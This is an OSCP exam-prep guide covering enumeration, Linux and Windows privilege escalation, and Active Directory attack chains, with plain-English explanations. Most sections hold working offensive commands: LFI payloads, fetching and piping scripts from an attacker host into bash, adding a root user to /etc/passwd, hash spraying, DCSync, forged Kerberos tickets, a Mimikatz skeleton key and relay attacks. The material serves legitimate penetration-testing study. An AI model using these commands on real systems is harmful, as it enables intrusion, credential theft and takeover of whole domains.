Concepts 101 — Start Here If You're New

▶ Read this if hacking is new to you

The rest of this guide assumes you know the basics. This section builds that foundation from zero — plain English, real-world analogies, and simple diagrams. Once these eight ideas click, every command later will make sense. (Already comfortable? Flip to ⚡ Exam Mode top-right and this whole section disappears.)

🎯 1. What does "hacking a machine" actually mean?

Your goal is simple: get the computer to run your commands, then become its most powerful user (root on Linux, SYSTEM on Windows). Every box you'll ever attack follows the same five-step loop. Memorise this loop — it's the spine of the entire exam.

The loop every box follows — find doors → break in → become admin → steal creds → reach the next machine

In one line each: Enumerate = find everything that's running. Exploit = abuse a weakness to get your first shell. Escalate = go from normal user to admin. Loot = grab passwords & keys. Pivot = use this machine to reach the next one.

🌐 2. IP addresses & ports

An IP address (like 10.10.10.5) is a computer's address on the network — how you find it. A port is a numbered doorway on that computer. Each open port runs one service (a program waiting for connections). Hacking starts by knocking on every door to see which are open and what's behind them.

One machine = one address with many numbered doors. Each open door is a potential way in.
Think of it like an apartment building. The street address is the IP. Each flat number is a port. Behind flat #80 lives the website, behind #22 lives remote login. A burglar tries every door first — that's enumeration.

💬 3. Client & server — how machines talk

A server is a program that waits and answers requests (a website, a database). A client is whoever asks (your browser, a tool). When you open a site, your browser (client) asks the web server on port 80/443, and the server replies. Almost every service you'll attack is a server waiting for input — and bad input is how you break in.

Think of it like a restaurant. You (client) place an order; the kitchen (server) prepares and sends it back. A web attack is like slipping a trick note into your order that makes the kitchen do something it shouldn't — like hand you the master keys.

🐚 4. What is a "shell"?

A shell is just a command line on the target machine — once you have one, you can type commands the victim computer will run. Getting that first shell = your foothold. The most common type is a reverse shell: instead of you connecting in (firewalls block that), you trick the target into connecting out to you.

Reverse shell: the victim connects to you, so inbound firewall rules don't stop it.
Think of it like a phone call. You can't call into a locked office (firewall). So you leave a note that says "call this number." When the target calls you, you're connected — and now you can talk (run commands).

🖥️ 5. Linux vs Windows — the two worlds

OSCP boxes are either Linux or Windows, and the "god user" is named differently on each. Everything else — the loop — stays the same.

The AD (Active Directory) set is just multiple Windows machines managed by one central server. Own that server and you own them all — covered fully in Section 5.

🔑 6. Linux file permissions (rwx)

On Linux, every file says who can read, write, and execute it — split into three groups: the owner, the group, and everyone else. Misconfigured permissions (e.g. a root-owned script you can write to) are a classic way to escalate to root.

If a file root runs is writable by you (w in the wrong place), you can make it run your code as root.

#️⃣ 7. What is a hash?

Systems never store your real password — they store a hash: a scrambled fingerprint of it. Hashing is one-way: easy to turn "password123" into a hash, practically impossible to turn the hash back into "password123". So "cracking" doesn't reverse anything — you guess millions of passwords, hash each guess, and look for a match.

Think of it like a blender. Throw in a fruit and you always get the exact same smoothie — but you can't un-blend the smoothie back into the fruit. To find what went in, you blend fruits one by one until a smoothie matches. That's password cracking with hashcat.

Two routes you'll use constantly: steal a hash → crack it offline (fast, silent); or steal a hash → just log in with the hash itself on Windows (Pass-the-Hash — no cracking needed). Both are in Section 9.

That's the whole foundation. Whenever a word confuses you, the Glossary (Section 16) has it in plain English, and if you freeze, Section 17 tells you what to do.

Exam Structure & Strategy

The exam in 60 seconds

OSCP is a 24-hour hands-on hacking exam, not a multiple-choice test. You get 6 machines: 3 standalone boxes + 1 Active Directory set of 3 machines. You must hack into them and prove it by capturing flag files (local.txt and proof.txt).

You need 70 / 100 points to pass. After the 24-hour hacking window, you get a second 24 hours to write a professional report documenting exactly how you broke in. No report = automatic fail, even with 100 points.

Strategy that passes: do the AD set first (40 guaranteed points if you follow the chain), then pick off standalones. The point breakdown below shows exactly where every point comes from.

No bonus points anymore. The old "10 bonus points for 80% lab completion" scheme ended with the Nov 2024 OSCP+ format change — 70/100 must be earned live on exam day, full stop.

OSCP vs OSCP+: passing today awards you both — OSCP (lifetime credential, the name recruiters recognise) and OSCP+ (same cert, but expires after 3 years unless renewed via CPEs, a recert exam, or another qualifying OffSec cert). Keep this in mind for long-term career planning — don't let it lapse quietly.

Universal Enumeration Framework

Why this matters

Enumeration = finding doors before you try to kick them in. The goal here is to build a complete picture of the target: what ports are open, what software is running, and what versions. Each open port is a potential way in.

The #1 student mistake: running one quick nmap scan, seeing port 80, and tunnel-visioning on the website for 3 hours — while the real foothold was a forgotten anonymous FTP on port 21. Scan everything (all 65,535 ports + UDP top 20) before you commit to any one path.

Golden rule: for every service you find, ask three questions — What version is it? Are there known exploits (searchsploit)? Can I log in with default/blank/anonymous creds?

Initial Recon — Run in Parallel

# Setup workspace
mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}

# Parallel quick scans on ALL targets:
for ip in <MS01_IP> <MS02_IP> <DC_IP> <BOX1_IP> <BOX2_IP> <BOX3_IP>; do
    nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &
done; wait

# Full TCP per machine:
nmap -p- -sV -sC --open -T4 <TARGET_IP> -oN full_tcp.txt

# UDP top 20 — DON'T SKIP (SNMP/TFTP/DNS often critical):
nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt

Standalone Linux Box Methodology

How to think about a box

A "standalone box" is one machine to fully own — get a shell, then escalate to root. Most Linux boxes are cracked through a web app on port 80/443, so that's usually where you start. The web attacks below are the common ways in: find the flaw, get code execution, land a shell.

The loop never changes: enumerate the web app → spot a weakness (file upload, LFI, SQLi, known CVE) → turn it into a reverse shell → then run the PrivEsc checklist further down to become root.

Linux Web Attack Techniques

LFI / Local File Inclusion

# Basic traversal:
/page.php?file=../../../../etc/passwd
/page.php?file=../../../../etc/shadow
/page.php?file=/proc/self/environ

# PHP wrappers:
/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Decode: echo '<BASE64>' | base64 -d

# Log Poisoning → RCE:
# Step 1: Inject PHP into Apache log via User-Agent:

# Step 2: Include log file:
/page.php?file=/var/log/apache2/access.log&cmd=id

# SSH log poisoning:

/page.php?file=/var/log/auth.log&cmd=whoami

Linux Privilege Escalation Checklist

Mental model

Privilege escalation = you're already inside as a normal user; now you want to become root. You're hunting for one mistake the admin made. The four most common on OSCP boxes, in order of frequency:

1. Sudo rights — sudo -l shows commands you can run as root. Look each one up on GTFOBins. 2. SUID binaries — programs that run as their owner (often root); again, check GTFOBins. 3. Cron jobs — scripts root runs on a schedule that you can edit. 4. Credentials lying around — config files, .bash_history, database passwords reused for the root account.

Always run an automated enumerator first (linpeas.sh), but never only rely on it — read the output and verify the RED/YELLOW findings manually. linpeas finds clues; you connect them.

# STEP 1: Run linpeas immediately
curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out
# Look for RED/YELLOW highlights first

# ── Context ──────────────────────────────────────────────────
whoami && id && hostname
uname -a && cat /etc/os-release
env | grep -i "pass\|key\|secret\|token"
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null

# ── Sudo ─────────────────────────────────────────────────────
sudo -l
# NOPASSWD → check GTFObins immediately!
# Common: sudo find . -exec /bin/bash \; -p
#         sudo python3 -c 'import os; os.system("/bin/bash")'
#         sudo vim → :!/bin/bash

# ── SUID ─────────────────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
# Each result → GTFObins

# ── Capabilities ─────────────────────────────────────────────
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# ── Cron Jobs ────────────────────────────────────────────────
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
# Writable script run as root → append revshell
# Wildcard (tar/rsync) → wildcard injection

# ── Writable /etc/passwd ─────────────────────────────────────
openssl passwd -1 haxpass
echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax

# ── NFS no_root_squash ───────────────────────────────────────
cat /etc/exports
# If: /share *(rw,no_root_squash) →
# On ATTACKER (as root):
mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash
# On VICTIM:
/tmp/bash -p    # → ROOT

# ── Docker group ─────────────────────────────────────────────
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ── Internal services ────────────────────────────────────────
ss -tlnp   # local-only → port forward → exploit

# ── glibc / Looney Tunables (CVE-2023-4911) ──────────────────
# Common on newer Ubuntu 22.04/23.x, Debian 12, Fedora — check version:
ldd --version   # glibc 2.34–2.39 vulnerable
# If vulnerable, download exploit-nation's PoC and run:
python3 exploit.py

Windows Privilege Escalation

Mental model

Same idea as Linux, different doors. You're a normal Windows user hunting for a path to SYSTEM (Windows' equivalent of root). Run winPEAS first, then check these in order:

1. Token privileges — run whoami /priv. If you see SeImpersonatePrivilege, you almost certainly win with a "Potato" exploit. 2. Service misconfigs — unquoted service paths or services you can modify let you run code as SYSTEM. 3. Stored credentials — unattend.xml, registry autologon, saved PowerShell history, web.config. 4. Missing patches — old kernels are vulnerable to known exploits.

First thing to type every time: whoami /priv and whoami /groups. They often hand you the answer in seconds.

Active Directory Attack Chains

⚠ OSCP AD SET IS ASSUMED BREACH. You receive valid domain credentials at exam start (e.g. stephanie:Password123@corp.local). You are already a low-priv domain user. Enumerate AD immediately.
AD in plain English

Active Directory is the central "user database" for a Windows company network. One server — the Domain Controller (DC) — holds every user, computer, password hash, and permission. Own the DC and you own the entire network.

Why the chain works: companies almost never give a normal user direct admin on the DC. So you climb sideways and upward: start as a low-priv user → enumerate to find a misconfiguration or a second set of creds → move to another machine (lateral movement) → repeat until you find a path to Domain Admin. BloodHound literally draws this path for you.

Key terms you'll see below: Kerberoasting and AS-REP Roasting = stealing crackable password hashes from the way Windows logins work. Pass-the-Hash = logging in with a stolen hash without ever knowing the plaintext password. DCSync = impersonating a DC to dump everyone's hashes. Full definitions are in the Glossary (Section 16).

Kerberos in plain English — read this before the "roasting" attacks

Kerberos is how Windows logs you in without passing your password around. Picture a cinema: you show ID once at the entrance and get a wristband (a ticket). After that, every screen lets you in by checking the wristband — you never show ID again.

Why hackers care: some of those tickets are encrypted with a user's password hash. If you can request such a ticket and take it offline, you can keep guessing passwords until one decrypts it. That's exactly what Kerberoasting and AS-REP Roasting (below) do — you're not breaking Kerberos, you're abusing a normal feature that hands you crackable material.

AD Full Attack Flow

PROVIDED CREDS (stephanie:Password123) │ ▼ Phase 1: RAPID AD ENUMERATION BloodHound + nxc + LDAP + PowerView │ ▼ Phase 2: QUICK WINS (all simultaneously) ├── AS-REP Roasting ├── Kerberoasting ├── Passwords in descriptions (VERY COMMON) ├── SMB share hunting └── GPP/SYSVOL passwords │ ▼ Phase 3: FOOTHOLD on MS01 (local.txt = 10 pts) │ ▼ Phase 4: PIVOT to MS02 (local.txt = 10 pts) Setup Ligolo-ng tunnel → lateral move │ ▼ Phase 5: ESCALATE to Domain Admin ACL abuse / DCSync / Delegation / GPO │ ▼ Phase 6: OWN DC (proof.txt = 20 pts) PSExec/WMIexec as DA → dump NTDS → Golden Ticket
How the 40 AD points actually work

The AD set is 3 chained machines worth 40 points total — the highest-value and most predictable part of the exam. Points are banked as you progress: MS01 local.txt = 10, MS02 local.txt = 10, DC proof.txt = 20. So even if you don't fully own the DC, reaching MS01 and MS02 still banks 20 points.

The one insight that makes AD click: it's a chain, not three separate boxes. The credentials and hashes you loot on one machine are the keys to the next. Every phase is the same rhythm — enumerate → find a quick win → get a foothold → loot creds → reuse them to move forward → finally reach Domain Admin and own the DC.

Post-Exploitation on MS01 — Local PrivEsc → Loot → Bridge to MS02

⚠ This is the step most students skip. Getting a low-priv shell on MS01 isn't the goal — it's the starting point. You need to escalate locally on MS01 first, then loot it properly, because the credentials/tickets that unlock MS02 are usually sitting on MS01, not found through more AD enumeration. Same mental model applies whether MS01 is domain-joined Windows, domain-joined Linux, or a standalone box in a multi-machine chain.
Why local privesc first

A low-priv domain user's shell on MS01 usually can't read LSASS, LSA secrets, or other users' saved creds — you need local admin/SYSTEM on MS01 itself first. Run the exact same "Standalone Windows PrivEsc" checklist from Section 4 (SeImpersonate → Potato, service misconfigs, unattend.xml, etc.) — being domain-joined changes nothing about how you escalate locally, it only changes what you go looking for once you're admin.

AS-REP Roasting

What & why

Some accounts have "Kerberos pre-authentication" switched off. For those, you can ask the DC for a login ticket without proving who you are first — and that ticket is encrypted with the account's password hash. Grab it, crack it offline with hashcat, and you have a real password. Prerequisite: an account with pre-auth disabled (BloodHound → "Find AS-REP Roastable Users"). It can even work with no creds if you can guess valid usernames.

GetNPUsers.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt

# Windows (Rubeus):
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Kerberoasting

What & why

Service accounts (any account with an "SPN") can be targeted by any logged-in user. You request a service ticket for them, and part of that ticket is encrypted with the service account's password — so you crack it offline. These accounts often have weak, never-rotated passwords, making this one of the most reliable AD wins. Prerequisite: valid domain creds (you have them) + an SPN account (BloodHound → "Find Kerberoastable Users"). Add best64.rule to hashcat for tougher passwords.

GetUserSPNs.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -outputfile kerb.txt

# Windows (Rubeus):
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# Crack:
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

GPP / SYSVOL

What & why

Older admins set local passwords through "Group Policy Preferences" (GPP), and Windows stored them — encrypted — in a share that every domain user can read (SYSVOL). The fatal flaw: Microsoft once published the decryption key, so gpp-decrypt instantly reverses them into plaintext. If GPP passwords exist, they're free credentials. Always check.

nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
gpp-decrypt <CPASSWORD_VALUE>

ADCS — Active Directory Certificate Services

⚠ CRITICAL GAP: ADCS attacks (ESC1-ESC8) are now common in OSCP AD sets. Any domain user can escalate to Domain Admin if misconfigured. Always enumerate ADCS with provided creds.
What ADCS is — explained simply

ADCS is the company's certificate authority — the system that issues digital ID cards (certificates) that can be used to log in. If a certificate "template" is misconfigured, a normal user can request a certificate that effectively says "I am the Administrator," then log in as Administrator with it. That's a direct jump from low-priv user to Domain Admin, which is why ESC1–ESC8 are now exam favourites.

The flow is always the same: certipy find -vulnerable tells you if a template is exploitable → request a cert impersonating Administrator → certipy auth turns that cert into Administrator's NTLM hash → Pass-the-Hash to own the domain. ESC1 = you're allowed to set the cert's name (most common). ESC8 = relay the DC itself into requesting a cert for you.

# Enumerate vulnerable templates (run immediately with provided creds):
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -vulnerable -stdout

# Also save BloodHound data:
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -bloodhound

# ── ESC1 — User can specify SAN (most common) ─────────────────
# Conditions: Enrollee Supplies Subject=True + Client Auth + low-priv enrollment
certipy req -u 'stephanie@corp.local' -p 'Password123' \
    -ca corp-CA -template VulnerableTemplate \
    -upn Administrator@corp.local -dc-ip 192.168.x.100
# Authenticate with cert → get NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
# → Administrator NTLM hash → PTH → Domain Admin!

# ── ESC8 — NTLM Relay to ADCS HTTP endpoint ──────────────────
# Setup certipy relay:
certipy relay -target http://<ADCS_IP>/certsrv/certfnsh.asp \
    -template DomainController
# Trigger DC authentication (PetitPotam):
python3 PetitPotam.py -u stephanie -p 'Password123' \
    <LHOST> <DC_IP>
# Gets: DC machine certificate → authenticate as DC → DCSync everything

# ── ESC4 — Write access to template ──────────────────────────
# BloodHound shows WriteProperty on certificate template
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -save-old   # backup original
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -configuration VulnTemplate.json
# Now request as ESC1

# ── After getting cert → auth → hash → DA ────────────────────
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
# Hash from output → PTH:
psexec.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
secretsdump.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>

Pass-the-Ticket

What & why

Remember the Kerberos "wristband" ticket? If you land on a machine where a privileged user left a ticket sitting in memory, you can steal it and reuse it to access whatever they could — no password needed. triage/dump grab the tickets; ptt ("pass the ticket") injects one into your session so you effectively become that user.

# Windows (Rubeus):
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
dir \\<TARGET_FQDN>\C$

# Linux:
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>

Overpass-the-Hash

What & why

The bridge between the two login worlds. If you hold an NTLM hash but the target only accepts Kerberos, Overpass-the-Hash converts that hash into a fresh Kerberos ticket (TGT) so you can use ticket-based tools to move laterally. Reach for it when plain Pass-the-Hash is blocked but Kerberos is allowed.

# NTLM hash → Kerberos TGT:
.\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt

# Linux:
getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>

Lateral Movement — Pass-the-Hash

What & why

On Windows you often don't need to crack a hash — you can log in with the hash itself. Once you've dumped an Administrator NTLM hash, feed it to psexec / wmiexec / evil-winrm to get a shell on any machine that account is admin on. Always spray the hash across the whole subnet first (nxc ... --continue-on-success) to find every box it unlocks.

# Verify hash:
nxc smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth

# Spray hash across subnet:
nxc smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> \
    --local-auth --continue-on-success | grep "+"

# Get shell:
psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>

DCSync Attack

What & why

Domain Controllers replicate their password database to each other. DCSync abuses that: if your account has replication rights (you earn them via ACL abuse, ADCS, or after reaching DA), you pretend to be a DC and politely ask the real DC for everyone's password hashes — including krbtgt and Administrator. It's the standard way to "dump the whole domain" without touching the DC's disk. Grabbing krbtgt here also sets up the Golden Ticket below.

secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator

# Mimikatz:
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /all /domain:corp.local

ACL Abuse — Common BloodHound Paths

What ACLs are — and the rights to hunt for

An ACL is the list of "who is allowed to do what" to an AD object. Admins misconfigure these constantly, and BloodHound draws each one as an arrow between accounts. Each right is its own attack: GenericAll = full control (reset their password, or add yourself to a group). WriteDACL = you can grant yourself more rights, including DCSync. GenericWrite = enough for Shadow Credentials or targeted Kerberoasting. GenericAll on a computer = set up RBCD to impersonate its admin. The commands below map one-to-one to those BloodHound edges.

# GenericAll on User → force password reset:
Set-DomainUserPassword -Identity targetuser \
    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

# GenericAll on Group → add to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie

# WriteDACL on Domain → grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity stephanie -Rights DCSync
# → now run secretsdump

# GenericAll on Computer → RBCD Attack:
addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
    'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>

Golden Ticket

What & why

The krbtgt account's hash is the master key that signs every Kerberos ticket in the domain. Once you've dumped it (via DCSync), you can forge a "Golden Ticket" — a ticket claiming to be anyone, including a Domain Admin, valid for years. It's mainly a persistence trick; on the exam you'll usually already own the DC by this point, but it proves total, lasting control of the domain.

# Requirements: krbtgt NTLM hash + Domain SID
ticketer.py -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>

mitm6 — IPv6 DNS Takeover (Pre-Creds Initial Access)

What & why

Most networks run IPv6 but don't manage it. Windows machines prefer IPv6 by default and auto-request an address via DHCPv6. mitm6 answers those requests, makes you the machine's IPv6 DNS server, then feeds it a fake WPAD proxy — every HTTP request (including Windows Update/telemetry checks) routes through you, capturing NTLM auth which you relay straight into LDAP. This is a genuine no-creds-needed path to a foothold if the AD set's box has any unauthenticated network access.

# Terminal 1 — start the IPv6 DNS takeover:
mitm6 -d corp.local --ignore-nofqdn

# Terminal 2 — relay captured auth into LDAP, escalate a user's rights:
ntlmrelayx.py -6 -t ldaps://192.168.x.100 --delegate-access -wh fakewpad.corp.local

# Result: relayed machine account gets RBCD rights → chain into a shell:
getST.py -spn cifs/<TARGET_FQDN> corp.local/'FAKE-COMPUTER$':'' -impersonate Administrator -dc-ip 192.168.x.100

Delegation Attacks — Unconstrained / Constrained / RBCD

Mental model

Delegation lets a service impersonate a user to reach a second service on their behalf (e.g. a web server needs to query a database as the logged-in user). Three flavours, worst-to-best for defenders: Unconstrained = the box can impersonate anyone who authenticates to it, including a Domain Admin, so you just have to coerce a DA/DC to connect. Constrained (S4U2Proxy) = restricted to specific target services, but if you own the delegating account you can impersonate anyone against those services. RBCD = the target itself decides who can delegate to it — if you have write access to that setting, you grant yourself delegation rights.

# ── Unconstrained: find it, then coerce a DC to auth to it ──
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
# Coerce the DC (PrinterBug/PetitPotam) while monitoring for the TGT:
python3 printerbug.py corp.local/stephanie:'Password123'@DC01 attacker-ip
Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Use the captured TGT:
Rubeus.exe ptt /ticket:<base64_ticket>

# ── Constrained (S4U2Proxy) — you control an account with delegation set ──
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
getST.py -spn cifs/target.corp.local -impersonate Administrator \
    corp.local/svc_account:'Password123' -dc-ip 192.168.x.100

# ── RBCD — you have GenericWrite/GenericAll on the target computer ──
rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKPC$' -dc-ip 192.168.x.100 -action write corp.local/stephanie:'Password123'
getST.py -spn cifs/target.corp.local corp.local/'ATTACKPC$':'Attack123!' -impersonate Administrator -dc-ip 192.168.x.100

Silver Ticket & Diamond Ticket

Golden Ticket's quieter cousins

Silver Ticket forges a service ticket using a service account's hash (not krbtgt) — narrower access (one service only) but never touches the DC, so it's stealthier. Diamond Ticket takes a real TGT and modifies its PAC in place rather than forging one from scratch, which evades detections that look for "ticket with no matching AS-REQ".

# Silver Ticket (needs the target service account's NTLM hash):
ticketer.py -nthash <SERVICE_ACCT_NTLM> -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local -spn cifs/target.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local

# Diamond Ticket (Rubeus, needs krbtgt hash + a real TGT to modify):
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
    /groups:512 /krbkey:<KRBTGT_AES256> /domain:corp.local /dc:DC01.corp.local /ptt

Skeleton Key — Domain-Wide Master Password

What & why

Once you have admin on a DC, Mimikatz can patch LSASS in memory to accept one extra master password for every account in the domain — without changing anyone's real password (so nothing looks broken). It doesn't survive a reboot, so it's a same-session persistence trick, not a report-worthy "found vulnerability" — mention it as a technique, don't rely on it for exam points.

mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now ANY account authenticates with its real password OR "mimikatz":
nxc smb 192.168.x.100 -u administrator -p mimikatz

LAPS & gMSA — Stored Credential Extraction

# ── LAPS: local admin passwords stored in AD, readable if you have rights ──
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where {$_."ms-Mcs-AdmPwd" -ne $null}

DSRM Credentials & SID History (Trust Attacks)

# ── DSRM: local admin account baked into every DC, gives persistence ──

mimikatz # lsadump::sam /system:system.save /sam:sam.save

When you'll see these

AD Exam Scenarios — Every Box Type

How to use this section

Section 5 gives you the AD attack chain and the commands. This section gives you the "box" itself — for every major AD misconfiguration, what it actually looks like when you land on it in the exam (which BloodHound edge, which nxc/ldap output, which attribute), so you can pattern-match instantly instead of re-deriving it under pressure. 01
Password in the "Description" Field
Quick Win · Recon-Only

Recognize it: A plain LDAP/ldapsearch dump of user descriptions shows a readable password sitting in plaintext — admins use the field as a personal note ("temp pw: Summer2024!", "reset by helpdesk — Passw0rd").

Scenario: You have low-priv creds (stephanie:Password123) on corp.local. BloodHound shows nothing obviously exploitable for stephanie herself. You dump every user's description field and one account has its password written in plain sight.

ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' \
    -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description

# or with nxc:
nxc ldap 192.168.x.100 -u stephanie -p 'Password123' -M get-desc-users

Result: A second, often more privileged, set of valid creds — re-run BloodHound as this new user before doing anything else.

02
AS-REP Roastable Account
Quick Win · Offline Crack

Recognize it: BloodHound's "Find AS-REP Roastable Users" query returns a hit, or the account's userAccountControl has DONT_REQ_PREAUTH set. Often a service/legacy account someone disabled pre-auth on to fix a compatibility issue and forgot about.

Scenario: BloodHound flags svc_backup as AS-REP roastable. You don't even need valid creds to request the ticket for it — a valid username guess is enough.

GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.x.100 \
    -request -format hashcat -outputfile asrep.txt
# with creds instead of a userlist:
GetNPUsers.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -format hashcat

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Result: Cracked plaintext password for svc_backup — check its group memberships immediately, service accounts are frequently local admin somewhere.

03
Kerberoastable Service Account (SPN)
Quick Win · Offline Crack

Recognize it: BloodHound's "Find Kerberoastable Users" lights up, or setspn -Q */* / nxc ldap --kerberoasting returns an account with an SPN set that isn't krbtgt. Any authenticated user can request a ticket for it.

Scenario: sqlsvc has an SPN registered for MSSQL. You request its service ticket with your existing low-priv creds and crack it offline.

GetUserSPNs.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -outputfile kerb.txt

hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

Result: Cracked service account password — same rule as AS-REP: check what it's local admin on before moving further.

04
GPP / SYSVOL Stored Password (cpassword)
Quick Win · No Cracking

Recognize it: A Groups.xml, ScheduledTasks.xml, or Services.xml sits under a Group Policy folder in \\corp.local\SYSVOL\corp.local\Policies\... and contains a cpassword="..." attribute — leftover from Group Policy Preferences, which Microsoft's AES key for this was published years ago, so it decrypts instantly. Any authenticated user can read SYSVOL.

Scenario: An old GPO was used to push a local admin password to workstations via GPP and was never cleaned up after the feature was deprecated.

# Mount/list SYSVOL and search:
smbclient //192.168.x.100/SYSVOL -U stephanie%Password123 -c 'recurse;ls'
# or automated:
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
# or:
Get-GPPPassword.py -u stephanie -p 'Password123' -d corp.local -dc-ip 192.168.x.100
# manual decrypt if you only have the cpassword blob:
gpp-decrypt ''

Result: Plaintext local-admin (or domain) password, decrypted instantly — no cracking needed.

05
ACL Abuse — GenericAll / GenericWrite / WriteDACL / ForceChangePassword
BloodHound-Driven

Recognize it: BloodHound draws an edge from a user/group you control straight to another principal — GenericAll, GenericWrite, WriteOwner, WriteDACL, or ForceChangePassword. This is the single most common OSCP AD privesc path: someone was given helpdesk-style rights over an object and it was never scoped correctly.

Scenario: stephanie has GenericAll over user jdoe (a Domain Admin). No cracking required — you can just reset jdoe's password directly.

# ForceChangePassword / GenericAll → reset target's password:
net rpc password "jdoe" "NewP@ssw0rd!" -U corp.local/stephanie%Password123 -S 192.168.x.100
# or:
bloodyAD --host 192.168.x.100 -d corp.local -u stephanie -p Password123 \
    set password jdoe 'NewP@ssw0rd!'

# GenericAll over a GROUP → add yourself to it:
net rpc group addmem "Domain Admins" "stephanie" -U corp.local/stephanie%Password123 -S 192.168.x.100

# WriteDACL → grant yourself DCSync rights on the domain object, then DCSync (see card 10)
dacledit.py -action write -rights DCSync -principal stephanie -target-dn "DC=corp,DC=local" \
    corp.local/stephanie:Password123 -dc-ip 192.168.x.100

Result: Direct takeover of the target account/group — often the shortest path straight to Domain Admin, no delegation or Kerberos abuse needed.

06
Unconstrained Delegation
Kerberos · TGT Capture

Recognize it: BloodHound's "Computers with Unconstrained Delegation" shows a machine (often a print server, IIS box, or misconfigured app server — not the DC). Any account that authenticates to this machine has its full TGT cached in memory on it.

Scenario: APP01$ has unconstrained delegation. If you get admin on APP01 and coerce the DC (or wait for a DA) to authenticate to it, their TGT lands in memory for you to grab.

# On APP01, once you're admin, start monitoring for tickets:
Rubeus.exe monitor /interval:5 /filteruser:DC01$

